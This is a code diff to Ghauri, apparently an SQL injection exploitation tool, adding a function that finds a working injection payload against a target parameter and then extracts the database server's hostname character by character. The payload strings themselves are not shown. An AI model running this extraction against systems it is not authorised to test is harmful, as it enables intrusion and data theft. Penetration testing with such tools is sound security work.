@@ -36,6 +36,7 @@ from ghauri.common.payloads import (
     PAYLOADS_TBLS_COUNT,
     PAYLOADS_COLS_COUNT,
     PAYLOADS_RECS_COUNT,
+    PAYLOADS_HOSTNAME,
 )
 
 from ghauri.common.lib import collections
@@ -213,6 +214,95 @@ class GhauriCommon:
                 else:
                     logger.info("retrieved: '%s'" % (retval.result))
                 logger.success(f"current user: '{retval.result}'")
+            else:
+                error = retval.error
+                if error:
+                    message = f"Ghauri detected an error during current user extraction ({error})"
+                    logger.warning(f"{message}")
+                logger.end("ending")
+                exit(0)
+        else:
+            retval = guess
+        return retval
+
+    def fetch_hostname(
+        self,
+        url,
+        data,
+        vector,
+        parameter,
+        headers,
+        base,
+        injection_type,
+        backend="",
+        proxy=None,
+        is_multipart=False,
+        timeout=30,
+        delay=0,
+        timesec=5,
+        attack=None,
+        match_string=None,
+        not_match_string=None,
+        code=None,
+        text_only=False,
+    ):
+        logger.info("fetching hostname")
+        Response = collections.namedtuple(
+            "Response",
+            ["ok", "error", "result", "payload"],
+        )
+        guess = ghauri_extractor.fetch_characters(
+            url=url,
+            data=data,
+            vector=vector,
+            parameter=parameter,
+            headers=headers,
+            base=base,
+            injection_type=injection_type,
+            payloads=PAYLOADS_HOSTNAME.get(backend),
+            backend=backend,
+            proxy=proxy,
+            is_multipart=is_multipart,
+            timeout=timeout,
+            delay=delay,
+            timesec=timesec,
+            attack01=attack,
+            match_string=match_string,
+            not_match_string=not_match_string,
+            code=code,
+            query_check=True,
+            text_only=text_only,
+        )
+        if guess.ok:
+            logger.debug(f"working payload found: '{guess.payload}'")
+            retval = ghauri_extractor.fetch_characters(
+                url=url,
+                data=data,
+                vector=vector,
+                parameter=parameter,
+                headers=headers,
+                base=base,
+                injection_type=injection_type,
+                payloads=[guess.payload],
+                backend=backend,
+                proxy=proxy,
+                is_multipart=is_multipart,
+                timeout=timeout,
+                delay=delay,
+                timesec=timesec,
+                attack01=attack,
+                match_string=match_string,
+                not_match_string=not_match_string,
+                code=code,
+                text_only=text_only,
+                dump_type="hostname",
+            )
+            if retval.ok:
+                if retval.resumed:
+                    logger.info("resumed: '%s'" % (retval.result))
+                else:
+                    logger.info("retrieved: '%s'" % (retval.result))
+                logger.success(f"hostname: '{retval.result}'")
             else:
                 error = retval.error
                 if error:
